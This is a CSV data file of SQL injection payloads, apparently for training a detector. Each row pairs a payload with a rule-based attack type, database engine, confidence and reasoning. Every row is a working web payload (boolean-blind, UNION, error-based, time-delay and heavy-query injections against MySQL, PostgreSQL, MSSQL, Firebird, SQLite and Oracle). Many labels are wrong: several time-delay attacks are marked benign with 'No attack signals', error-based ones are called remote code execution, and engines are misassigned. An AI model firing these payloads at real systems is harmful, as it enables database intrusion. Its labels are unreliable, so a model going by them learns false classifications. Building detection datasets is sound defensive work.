row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10950,"1' in boolean mode ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) #",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10951,-3185' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'rknd' like 'rknd,1,,boolean_blind,postgresql,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on postgresql",rule-based
10952,"1"" ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""njdu"" like ""njdu",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
10953,1%' ) ) ) and 2444 = 9282#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10954,"-3975' ) or make_set ( 1943 = 3499,3499 ) and ( 'dawb' = 'dawb",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10955,"-8021"" ) union all select 1166,1166,1166,1166--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10956,1'|| ( select 'rjun' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||',1,,boolean_blind,generic,0.95,8868 = 8868 and detected — boolean_blind injection (priority 8) on generic,rule-based
10957,"1 ) ) as zkrr where 4730 = 4730 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
10958,"1%"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10959,"1 ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 6578 = 6578",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10960,1' where 2661 = 2661,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10961,"-4686"" ) as dxks where 7123 = 7123 or elt ( 1032 = 1032,3623 ) --",1,,boolean_blind,generic,0.95,7123 = 7123 or detected — boolean_blind injection (priority 8) on generic,rule-based
10962,"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""dtwv"" like ""dtwv",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10963,"1"" ) as aifd where 5962 = 5962",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10964,"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'sjxp' like 'sjxp",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
10965,"-9487 ) ) as rvck where 9404 = 9404 or make_set ( 8921 = 6045,6045 ) --",1,,boolean_blind,generic,0.95,9404 = 9404 or detected — boolean_blind injection (priority 8) on generic,rule-based
10966,"1' ) as eany where 3169 = 3169 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10967,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'wvzb' = 'wvzb,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10968,"waitfor delay '0:0:5' and ( ""dmcu"" = ""dmcu",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10969,( select ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3287 = 3287 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10970,"1 ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 5199 = 5199",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10971,-3648' where 4629 = 4629 order by 1--,1,,boolean_blind,generic,0.95,4629 = 4629 or detected — boolean_blind injection (priority 8) on generic,rule-based
10972,"1' ) as irsh where 4973 = 4973 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10973,"1%' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10974,1 ) as mpnj where 5049 = 5049,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10975,1' ) as hqaq where 6411 = 6411 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10976,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10977,"-9031%"" ) order by 1--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10978,"1 ) as jqbv where 8172 = 8172 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
10979,"iif ( 9134 = 5736,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
